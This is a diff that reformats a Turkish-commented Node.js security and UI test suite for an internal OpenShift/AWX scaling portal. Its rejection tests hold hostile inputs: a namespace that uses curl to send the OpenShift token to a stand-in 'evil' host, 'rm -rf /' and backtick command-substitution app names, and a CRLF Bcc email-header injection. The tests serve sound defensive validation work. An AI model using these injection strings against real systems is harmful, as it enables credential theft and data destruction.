@@ -19,8 +19,19 @@ const launch = require('../launch.cjs');
 const gates = require('../../ansible/change-gates.cjs');
 const restrictions = require('../../logx/v2/restrictions.cjs');
 
-const codeOnly = (s) => s.split('\n').filter((l) => !/^\s*(\/\/|\*|\/\*)/.test(l)).join('\n');
+const codeOnly = (s) =>
+  s
+    .split('\n')
+    .filter((l) => !/^\s*(\/\/|\*|\/\*)/.test(l))
+    .join('\n');
 const read = (p) => fs.readFileSync(path.join(__dirname, '..', '..', '..', p), 'utf8');
+
+// ── BICIM DUYARSIZ OKUMA ────────────────────────────────────────────────────
+// Bu bekciler KURAL kilitler ("banner duyuruluyor mu", "izler temizleniyor mu"),
+// satir duzenini ve tirnak bicimini degil. Depoya prettier girince cagrilar cok
+// satira yayildi ve tirnaklar tekile dondu; kural aynen dururken bekciler KIRMIZI
+// oldu. `norm()` yalnizca bosluk ve tirnak esitler.
+const norm = (s) => s.replace(/\s+/g, ' ').replace(/'/g, '"');
 const INDEX = codeOnly(read('server/scalex/index.cjs'));
 
 // ── S1. OCO KAPISI: prod tespiti gateVars'tan da okunmali ───────────────────
@@ -43,7 +54,7 @@ test('S1: duzeltme oncesi davranis KIRMIZI olurdu — gateVars verilmezse ScaleX
   assert.equal(gates.isOcoGateApplicable(overrides, extraVars, undefined), false);
 });
 
-test('S1: Self Service GERILEMESI YOK — env extraVars\'ta ise kapi eskisi gibi ateslenir', () => {
+test("S1: Self Service GERILEMESI YOK — env extraVars'ta ise kapi eskisi gibi ateslenir", () => {
   const overrides = { ocoCheck: { enabled: true } };
   assert.equal(gates.isOcoGateApplicable(overrides, { env: 'prod' }, undefined), true);
   assert.equal(gates.isOcoGateApplicable(overrides, { ortam: 'PRODUCTION' }, {}), true);
@@ -51,11 +62,17 @@ test('S1: Self Service GERILEMESI YOK — env extraVars\'ta ise kapi eskisi gibi
 
 test('S1: prod DEGILSE kapi ateslenmez (genisletme daraltmaya donusmedi)', () => {
   const overrides = { ocoCheck: { enabled: true } };
-  assert.equal(gates.isOcoGateApplicable(overrides, { target_environment: 'test' }, { env: 'test' }), false);
+  assert.equal(
+    gates.isOcoGateApplicable(overrides, { target_environment: 'test' }, { env: 'test' }),
+    false,
+  );
 });
 
 test('S1: ocoCheck kapaliysa hicbir kaynak kapiyi acamaz', () => {
-  assert.equal(gates.isOcoGateApplicable({ ocoCheck: { enabled: false } }, { env: 'prod' }, { env: 'prod' }), false);
+  assert.equal(
+    gates.isOcoGateApplicable({ ocoCheck: { enabled: false } }, { env: 'prod' }, { env: 'prod' }),
+    false,
+  );
 });
 
 // ── S2. SMART KAPISI ────────────────────────────────────────────────────────
@@ -67,9 +84,13 @@ test('S2a: SMART "gerekli" iken ayar YOKSA is baslatilmaz (fail-closed)', () => 
   assert.match(INDEX, /smart_not_configured/);
 });
 
-test('S2a: bos ayarin smart-gate\'te GERCEKTEN onay gerektirmedigi (fail-closed sartinin sebebi)', () => {
+test("S2a: bos ayarin smart-gate'te GERCEKTEN onay gerektirmedigi (fail-closed sartinin sebebi)", () => {
   const smartGate = require('../../ansible/smart-gate.cjs');
-  assert.equal(smartGate.isSmartRequired({}, {}), false, 'bos ayar onay GEREKTIRMIYOR — route kontrolu bu yuzden sart');
+  assert.equal(
+    smartGate.isSmartRequired({}, {}),
+    false,
+    'bos ayar onay GEREKTIRMIYOR — route kontrolu bu yuzden sart',
+  );
   assert.equal(smartGate.isSmartRequired(undefined, {}), false);
 });
 
@@ -83,32 +104,52 @@ test('S2b: SMART bileti GERCEK sunucu/template kimligiyle acilir (0 degil)', () 
 
 // ── S5. /discover girdi dogrulamasi ─────────────────────────────────────────
 
-test('S5: /discover de format dogrulamasindan gecer (namespace playbook\'a ham gidiyordu)', () => {
+test("S5: /discover de format dogrulamasindan gecer (namespace playbook'a ham gidiyordu)", () => {
   const discover = INDEX.slice(INDEX.indexOf("router.post('/discover'"));
   const body = discover.slice(0, discover.indexOf('launchOnAwx'));
   assert.match(body, /assertValidDiscoveryTargets/);
 });
 
 test('S5: kabuk metakarakterli namespace REDDEDILIR', () => {
-  assert.throws(() => launch.assertValidDiscoveryTargets({ namespace: '; curl evil/$(oc whoami -t) #' }), /Geçersiz namespace/);
-  assert.throws(() => launch.assertValidDiscoveryTargets({ namespace: 'a b' }), /Geçersiz namespace/);
-  assert.throws(() => launch.assertValidDiscoveryTargets({ namespace: 'x'.repeat(64) }), /Geçersiz namespace/);
+  assert.throws(
+    () => launch.assertValidDiscoveryTargets({ namespace: '; curl evil/$(oc whoami -t) #' }),
+    /Geçersiz namespace/,
+  );
+  assert.throws(
+    () => launch.assertValidDiscoveryTargets({ namespace: 'a b' }),
+    /Geçersiz namespace/,
+  );
+  assert.throws(
+    () => launch.assertValidDiscoveryTargets({ namespace: 'x'.repeat(64) }),
+    /Geçersiz namespace/,
+  );
 });
 
 test('S5: kabuk metakarakterli uygulama adi REDDEDILIR', () => {
-  assert.throws(() => launch.assertValidDiscoveryTargets({ namespace: 'ok', apps: ['a; rm -rf /'] }), /Geçersiz uygulama/);
-  assert.throws(() => launch.assertValidDiscoveryTargets({ namespace: 'ok', apps: ['api', '`id`'] }), /Geçersiz uygulama/);
+  assert.throws(
+    () => launch.assertValidDiscoveryTargets({ namespace: 'ok', apps: ['a; rm -rf /'] }),
+    /Geçersiz uygulama/,
+  );
+  assert.throws(
+    () => launch.assertValidDiscoveryTargets({ namespace: 'ok', apps: ['api', '`id`'] }),
+    /Geçersiz uygulama/,
+  );
 });
 
 test('S5: gecerli girdi gecer ve apps kesifte OPSIYONEL kalir', () => {
   assert.doesNotThrow(() => launch.assertValidDiscoveryTargets({ namespace: 'odeme-prod' }));
-  assert.doesNotThrow(() => launch.assertValidDiscoveryTargets({ namespace: 'odeme-prod', apps: ['payment-api'] }));
+  assert.doesNotThrow(() =>
+    launch.assertValidDiscoveryTargets({ namespace: 'odeme-prod', apps: ['payment-api'] }),
+  );
 });
 
 // ── S11. mailCc — SMTP baslik enjeksiyonu ───────────────────────────────────
 
-test('S11: CC\'de CRLF (Bcc enjeksiyonu) REDDEDILIR', () => {
-  assert.throws(() => launch.sanitizeMailCc('ekip@x.com\r\nBcc: disari@saldirgan.com'), /satır sonu/i);
+test("S11: CC'de CRLF (Bcc enjeksiyonu) REDDEDILIR", () => {
+  assert.throws(
+    () => launch.sanitizeMailCc('ekip@x.com\r\nBcc: disari@saldirgan.com'),
+    /satır sonu/i,
+  );
   assert.throws(() => launch.sanitizeMailCc('a@x.com\nSubject: sahte'), /satır sonu/i);
   assert.throws(() => launch.sanitizeMailCc('a@x.com\tb'), /satır sonu/i);
 });
@@ -116,7 +157,10 @@ test('S11: CC\'de CRLF (Bcc enjeksiyonu) REDDEDILIR', () => {
 test('S11: adres formati zorunlu, adres sayisi sinirli', () => {
   assert.throws(() => launch.sanitizeMailCc('duz-metin'), /Geçersiz CC/);
   assert.throws(() => launch.sanitizeMailCc('a@x.com, bozuk@'), /Geçersiz CC/);
-  assert.throws(() => launch.sanitizeMailCc(Array.from({ length: 11 }, (_, i) => `a${i}@x.com`).join(',')), /en fazla 10/i);
+  assert.throws(
+    () => launch.sanitizeMailCc(Array.from({ length: 11 }, (_, i) => `a${i}@x.com`).join(',')),
+    /en fazla 10/i,
+  );
 });
 
 test('S11: gecerli CC normalize edilir, bos deger bos kalir', () => {
@@ -132,11 +176,15 @@ test('S11: route ham mailCc DEGIL, temizlenmis degeri kullanir', () => {
 
 // ── S6. /adopt — uydurma kayit ──────────────────────────────────────────────
 
-test('S6: /adopt kaydin SAHIBINI oturumdan alir, client\'tan DEGIL', () => {
+test("S6: /adopt kaydin SAHIBINI oturumdan alir, client'tan DEGIL", () => {
   const adopt = INDEX.slice(INDEX.indexOf("router.post('/adopt'"));
   const body = adopt.slice(0, adopt.indexOf('res.json'));
   assert.match(body, /stoppedBy: user\.username/);
-  assert.doesNotMatch(body, /req\.body\?\.stoppedBy/, 'client denetim izine baskasinin adini yazamamali');
+  assert.doesNotMatch(
+    body,
+    /req\.body\?\.stoppedBy/,
+    'client denetim izine baskasinin adini yazamamali',
+  );
 });
 
 test('S6: /adopt uygulama adini dogrular ve uygulama bazli yetkiyi UYGULAR', () => {
@@ -174,7 +222,8 @@ test('INFRA: grup grant tablosu YOKSA yetki sorgusu patlamaz (LogX/OpsX/Telnet a
     }
     return { rows: [{ id: 1, username: 'ali', group_dn: null }] };
   };
-  const warn = console.warn; console.warn = () => {};
+  const warn = console.warn;
+  console.warn = () => {};
   try {
     const user = { username: 'ali', role: 'User', groups: ['cn=x'] };
     // Patlamamali ve kullanici adi grant'i CALISMAYA DEVAM etmeli.
@@ -184,13 +233,14 @@ test('INFRA: grup grant tablosu YOKSA yetki sorgusu patlamaz (LogX/OpsX/Telnet a
     const veli = { username: 'veli', role: 'User', groups: ['cn=x'] };
     assert.equal(await restrictions.isAllowed('ocp_namespace', 'k', veli), false);
   } finally {
-    db.query = orig; console.warn = warn;
+    db.query = orig;
+    console.warn = warn;
   }
 });
 
 // ── S3. Oturum AD gruplarini tasimali ───────────────────────────────────────
 
-test('S3: oturum nesnesi `groups` tasir (yoksa grup grant\'i BASTAN SONA olu kalir)', () => {
+test("S3: oturum nesnesi `groups` tasir (yoksa grup grant'i BASTAN SONA olu kalir)", () => {
   const AUTH = codeOnly(read('server/auth/index.cjs'));
   assert.match(AUTH, /req\.session\.user = \{[\s\S]*?groups:/);
 });
@@ -208,7 +258,11 @@ test('S3: ldap gruplari normalize edip ustsinirla dondurmeye devam ediyor', () =
 
 test('OCO: ScaleX tek gecerli cevabi ("later") sunucuda verir — ekrana olmayan bir secim sorulmaz', () => {
   assert.match(INDEX, /ocoAction: 'later'/);
-  assert.doesNotMatch(INDEX, /ocoAction: req\.body\?\.ocoAction/, 'client\'tan ocoAction beklenmemeli');
+  assert.doesNotMatch(
+    INDEX,
+    /ocoAction: req\.body\?\.ocoAction/,
+    "client'tan ocoAction beklenmemeli",
+  );
 });
 
 test('OCO: ScaleX zamanlama YAPAMAZ — "later" disindaki cevap zaten hata verirdi', () => {
@@ -222,7 +276,7 @@ test('OCO: "later" ortak kapida is BASLATMADAN respond doner (dayanak)', () => {
 
 // ── SORGU SINIRLARI ─────────────────────────────────────────────────────────
 
-test('LIMIT: MIRROR_LIMIT ile SQL\'deki TOP birbirini tutar', () => {
+test("LIMIT: MIRROR_LIMIT ile SQL'deki TOP birbirini tutar", () => {
   // SQL'e sablon degiskeni koymak bu modulde yasak, bu yuzden `TOP 501` elle yazili.
   // Ikisi ayrisirsa kirpma sessizce yanlis yerde olurdu.
   const state = require('../state.cjs');
@@ -277,14 +331,17 @@ test('GORUNURLUK: elle calistirilabilir deploy betigi var ve idempotent', () => 
 
 // ── YAPILANDIRMA ────────────────────────────────────────────────────────────
 
-test('ENV: kodun okudugu her SCALEX_* degiskeni .env.example\'da belgeli', () => {
+test("ENV: kodun okudugu her SCALEX_* degiskeni .env.example'da belgeli", () => {
   const envExample = read('.env.example');
   // TUM `server/scalex/*` taranir, elle sayilan iki dosya DEGIL: liste elle tutuldugu
   // surece yeni bir dosyanin (orn. reconciler.cjs) degiskenleri sessizce belgesiz
   // kalir — nitekim tam olarak bu oldu.
   const fsx = require('node:fs');
   const dir = path.join(__dirname, '..');
-  const files = fsx.readdirSync(dir).filter((f) => f.endsWith('.cjs')).map((f) => `server/scalex/${f}`);
+  const files = fsx
+    .readdirSync(dir)
+    .filter((f) => f.endsWith('.cjs'))
+    .map((f) => `server/scalex/${f}`);
   // `process.env.X` VE `env_var_name: 'X'` (registry seed'i) — yani GERCEKTEN
   // okunan degiskenler. Ham `SCALEX_[A-Z_]+` taramasi yorumlardaki dosya adlarini
   // da (or. scalex_file/SCALEX_AWX_SETUP.md) degisken sanip yanlis kirmizi veriyordu.
@@ -302,7 +359,7 @@ test('ENV: kodun okudugu her SCALEX_* degiskeni .env.example\'da belgeli', () =>
 
 // ── EKRAN DUZELTMELERI ──────────────────────────────────────────────────────
 
-test('UI: onizleme satir anahtari CLUSTER icerir (ayni uygulama cok cluster\'da olabilir)', () => {
+test("UI: onizleme satir anahtari CLUSTER icerir (ayni uygulama cok cluster'da olabilir)", () => {
   const PREVIEW = codeOnly(read('src/components/scalex/steps/PreviewStep.tsx'));
   assert.match(PREVIEW, /key=\{`\$\{w\.cluster\}\/\$\{w\.name\}`\}/);
   assert.doesNotMatch(PREVIEW, /key=\{w\.name\}/, 'cakisan anahtar kalmamali');
@@ -328,7 +385,10 @@ test('UI: buton neden pasif oldugunu SOYLER, OCO numarasi bosken calistirilamaz'
 
 test('UI: iptal hata verirse buton KILITLI KALMAZ', () => {
   const PAGE = codeOnly(read('src/components/scalex/ScaleXPage.tsx'));
-  const cancelFn = PAGE.slice(PAGE.indexOf('function cancel()'), PAGE.indexOf('function cancel()') + 500);
+  const cancelFn = PAGE.slice(
+    PAGE.indexOf('function cancel()'),
+    PAGE.indexOf('function cancel()') + 500,
+  );
   assert.match(cancelFn, /setCancelling\(false\)/);
 });
 
@@ -337,9 +397,9 @@ test('UI: AWX is numarasi donmezse sonsuz spinner yerine mesaj gosterilir', () =
   assert.match(PAGE, /r\.ocoScheduled \|\| r\.jobId == null \|\| r\.serverId == null/);
 });
 
-test('UI: hata banner\'i ekran okuyucuya DUYURULUR', () => {
+test("UI: hata banner'i ekran okuyucuya DUYURULUR", () => {
   const PAGE = codeOnly(read('src/components/scalex/ScaleXPage.tsx'));
-  assert.match(PAGE, /role="alert" aria-live="assertive"/);
+  assert.match(norm(PAGE), /role="alert" aria-live="assertive"/);
 });
 
 test('UI: GitOps uyarisi (turuncu rozet) koyu temada okunabilir', () => {
@@ -365,8 +425,10 @@ test('S14: /cancel yalnizca ScaleX islerine dokunur', () => {
   assert.match(body, /if \(!own\.length\)/);
   // Kapsam kontrolu IPTALDEN ONCE olmali: once iptal edip sonra "bu bizim isimiz
   // degilmis" demek, isi zaten durdurmus olurdu.
-  assert.ok(body.indexOf('if (!own.length)') < body.indexOf('cancelJobOnServer'),
-    'kapsam kontrolu cancelJobOnServer cagrisindan ONCE gelmeli');
+  assert.ok(
+    body.indexOf('if (!own.length)') < body.indexOf('cancelJobOnServer'),
+    'kapsam kontrolu cancelJobOnServer cagrisindan ONCE gelmeli',
+  );
 });
 
 // ── ERISILEBILIRLIK VE EKRAN CIKMAZLARI (2. tur UX bulgulari) ───────────────
@@ -386,7 +448,9 @@ test('UI: mod kartlarinin devre disi gorunumu islem kartlariyla AYNI', () => {
   // Ayni ekranda iki farkli "devre disi" gorunumu vardi: islem kartlari
   // `opacity-50 cursor-not-allowed` aliyor, mod kartlari yalnizca `disabled` idi.
   const OP = codeOnly(read('src/components/scalex/steps/OperationStep.tsx'));
-  const modeCards = [...OP.matchAll(/setMode\("(?:dry_run|apply)"\)\}[\s\S]{0,400}?`\}/g)].map((m) => m[0]);
+  const modeCards = [...OP.matchAll(/setMode\("(?:dry_run|apply)"\)\}[\s\S]{0,400}?`\}/g)].map(
+    (m) => m[0],
+  );
   assert.equal(modeCards.length, 2, 'iki mod karti bulunamadi');
   for (const c of modeCards) assert.match(c, /opacity-50 cursor-not-allowed/);
 });
@@ -395,7 +459,10 @@ test('UI: uygulama adlari listelerde TEKILLESTIRILIYOR', () => {
   // `picked` (cluster × uygulama) satirlarindan geliyor; tekillestirilmezse ayni
   // uygulama uc cluster'da "api, api, api" olarak gorunuyordu.
   const OP = codeOnly(read('src/components/scalex/steps/OperationStep.tsx'));
-  assert.match(OP, /const uniq = \(ws: typeof picked\) => \[\.\.\.new Set\(ws\.map\(\(w\) => w\.name\)\)\]/);
+  assert.match(
+    OP,
+    /const uniq = \(ws: typeof picked\) => \[\.\.\.new Set\(ws\.map\(\(w\) => w\.name\)\)\]/,
+  );
   for (const list of ['notRestorable', 'alreadyStopped', 'withHpa']) {
     assert.match(OP, new RegExp(`const ${list} = uniq\\(`), `${list} tekillestirilmeli`);
   }
@@ -420,7 +487,7 @@ test('UI: kesif asilirsa gecen sure, AWX is numarasi ve CIKIS yolu var', () => {
 
 // ── GRUP GRANT'I: ozellik artik UCTAN UCA calisir ───────────────────────────
 
-test('INFRA: grup grant\'i olusturma/silme ucu VAR (yoksa ozellik kullanilamazdi)', () => {
+test("INFRA: grup grant'i olusturma/silme ucu VAR (yoksa ozellik kullanilamazdi)", () => {
   // `addGroupGrant`/`removeGroupGrant` yazilmis ve test edilmisti ama HICBIR route
   // cagirmiyordu: yetki bir AD grubuna verilebiliyor "gibi" gorunuyor, verilmesinin
   // yolu yoktu. Oturum `groups` tasimasi (S3) ve `ocp_app` tipi (S4) ile birlikte
@@ -432,7 +499,7 @@ test('INFRA: grup grant\'i olusturma/silme ucu VAR (yoksa ozellik kullanilamazdi
   assert.match(LOGX, /restrictions\.removeGroupGrant\(/);
 });
 
-test('INFRA: grup DN\'i URL\'e DEGIL govdeye konur', () => {
+test("INFRA: grup DN'i URL'e DEGIL govdeye konur", () => {
   // DN virgul/esittir/bosluk icerir; URL'e koymak hem kacis sorunu cikarir hem de
   // grup adlarini erisim loglarina yazardi.
   const LOGX = codeOnly(read('server/logx/v2/index.cjs'));
@@ -447,7 +514,7 @@ test('UI: dogrulama hatasindan ISLEM adimina donulebilir', () => {
   // yapmakti. Portal girdiyi zaten dogruladigi icin buraya dusen hatalar playbook
   // kaynaklidir — kullanici ayni girdiyi tekrar girip ayni hatayi alirdi.
   const PAGE = codeOnly(read('src/components/scalex/ScaleXPage.tsx'));
-  assert.match(PAGE, /runResult\?\.stage === "validation"/);
+  assert.match(norm(PAGE), /runResult\?\.stage === "validation"/);
   assert.match(PAGE, /İşlem adımına dön/);
 });
 
@@ -461,7 +528,7 @@ test('UI: `apply` modu da ACIKCA etiketleniyor (yalnizca dry_run rozet tasiyordu
   assert.match(PREVIEW, /Uygulanacak — değişiklik yapılır/);
 });
 
-test('UI: panelden geri alma onceki islemin BANNER\'ini temizler', () => {
+test("UI: panelden geri alma onceki islemin BANNER'ini temizler", () => {
   const PAGE = codeOnly(read('src/components/scalex/ScaleXPage.tsx'));
   const fn = PAGE.slice(PAGE.indexOf('function restoreFromPanel'));
   const body = fn.slice(0, fn.indexOf('setStep("preview")'));
@@ -470,7 +537,10 @@ test('UI: panelden geri alma onceki islemin BANNER\'ini temizler', () => {
   // Yalnizca banner'i temizlemek yetmiyordu: eski `runResult` ve `health` ekranda
   // kaliyordu (bkz. U13b).
   assert.match(body, /resetRunState\(\)/, 'onceki islemin izleri temizlenmiyor');
-  const reset = PAGE.slice(PAGE.indexOf('function resetRunState()'), PAGE.indexOf('function restart()'));
-  assert.match(reset, /setError\(null\); setNotice\(null\)/, 'banner temizligi kaybolmus');
+  const reset = PAGE.slice(
+    PAGE.indexOf('function resetRunState()'),
+    PAGE.indexOf('function restart()'),
+  );
+  assert.match(norm(reset), /setError\(null\); setNotice\(null\)/, 'banner temizligi kaybolmus');
   assert.match(body, /setOperationTouched\(true\)/, 'geri tusu bos form gostermemeli');
 });
